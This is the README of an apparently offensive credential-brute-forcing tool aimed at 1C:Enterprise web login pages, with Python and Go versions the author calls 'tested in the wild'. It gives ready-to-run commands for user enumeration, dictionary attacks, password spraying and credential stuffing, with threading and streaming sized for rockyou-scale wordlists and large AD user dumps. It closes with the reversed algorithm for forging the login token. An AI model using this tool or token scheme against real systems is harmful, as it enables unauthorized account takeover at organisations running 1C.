# wb1c

Web credential bruter for 1C:Enterprise web clients.

I reversed the JavaScript from a 1C login page and figured out how the auth token is generated before being sent to the server.

## Files

| File | Description |
|------|-------------|
| `1c_bruter.py` | Python version (POC, tested in the wild) |
| `1c_bruter.go` | Go version — single binary, no dependencies, TLS 1.0+ for legacy corporate servers |

## Install

**Python:**
```bash
pip install -r requirements.txt
```

**Go** (produces a single static binary):
```bash
go build -o wb1c 1c_bruter.go
# Windows:
go build -o wb1c.exe 1c_bruter.go
```

## Flags

| Flag | Python | Go | Description |
|------|--------|----|-------------|
| `-u USER` | ✓ | ✓ | Single username |
| `-U FILE` | ✓ | ✓ | File with usernames (one per line) |
| `-p PASS` | ✓ | ✓ | Single password |
| `-P FILE` | ✓ | ✓ | File with passwords (one per line) |
| `-l` | ✓ | ✓ | Fetch users list from the server |
| `-v` | — | ✓ | Verbose: show every attempt including failures |
| `-t INT` | — | ✓ | Number of concurrent threads (default: 1) |
| `-o FILE` | ✓ | ✓ | Save results to file |

## File encoding (Go only)

The Go version auto-detects the encoding of `-U` and `-P` files and handles:

- **UTF-8** (default for Linux/macOS tools)
- **UTF-8 BOM** (some editors)
- **UTF-16 LE** — the default when you save a `.txt` file on Russian Windows (Notepad, Excel export)
- **UTF-16 BE**

No flags needed — BOM detection is automatic.

## Memory model (Go only)

For large-scale attacks, the Go version streams files instead of loading them fully into memory.
The mode is chosen automatically by comparing file sizes:

| Scenario | Auto-selected mode | Streamed | In memory |
|----------|--------------------|----------|-----------|
| Spray: big user list + 1–few passwords | **Spray** | `-U` file | passwords |
| Brute: small user list + big wordlist | **Brute** | `-P` file | users |
| Mixed: both files provided | Whichever file is **larger** gets streamed | larger file | smaller file |

The selected mode is printed before the run starts:
```
Режим: спрей (стриминг пользователей из файла)
Режим: брут (стриминг паролей из файла)
```

This means a 14M-entry wordlist (rockyou) or a 200k-entry AD user dump both work without filling RAM.

## Usage Examples

### Recon — get users list

```bash
python 1c_bruter.py -l https://target/InfoBase
./wb1c -l https://target/InfoBase

# Save to file
python 1c_bruter.py -l -o users.txt https://192.168.1.100/accounting
./wb1c    -l -o users.txt https://192.168.1.100/accounting
```

### Check specific credentials

```bash
python 1c_bruter.py -u Administrator -p "Password123" https://target/InfoBase
./wb1c    -u Administrator -p "Password123" https://target/InfoBase

# Empty password
python 1c_bruter.py -u Administrator -p "" https://target/InfoBase
./wb1c    -u Administrator -p "" https://target/InfoBase
```

### Dictionary attack — one user, many passwords

```bash
python 1c_bruter.py -u Accountant -P passwords.txt https://target/InfoBase
./wb1c    -u Accountant -P passwords.txt https://target/InfoBase

# Go: verbose + save results
./wb1c -u Administrator -P passwords.txt -v -o results.txt https://target/InfoBase
```

### Password spraying — many users, one password

```bash
python 1c_bruter.py -U users.txt -p "Spring2024" https://target/InfoBase
./wb1c    -U users.txt -p "Spring2024" https://target/InfoBase

# Go: large AD dump — auto spray mode, 10 threads
./wb1c -U ad_users.txt -p "Spring2024!" -t 10 -o hits.txt https://target/InfoBase
```

### Credential stuffing — user list + password list

```bash
python 1c_bruter.py -U users.txt -P passwords.txt https://target/InfoBase
./wb1c    -U users.txt -P passwords.txt https://target/InfoBase

# Go: 10 threads; mode (spray vs brute) is chosen automatically
./wb1c -U users.txt -P passwords.txt -t 10 -o results.txt https://target/InfoBase
```

### Fetch users from server + bruteforce in one command

```bash
python 1c_bruter.py -l -P passwords.txt https://target/InfoBase
./wb1c    -l -P passwords.txt https://target/InfoBase
```

## Algorithm

```
key1     = AES256-CBC(data=rand(32), key=sha256(base64(sha1(password))))
key2     = AES256-CBC(data=rand(32), key=sha256(base64(sha1(upper(password)))))
payload  = [0x01, len(key1), key1, len(key2), key2, LE32(len(username)), username]
checksum = crc32(payload)
token    = base64(payload + LE32(checksum))
```
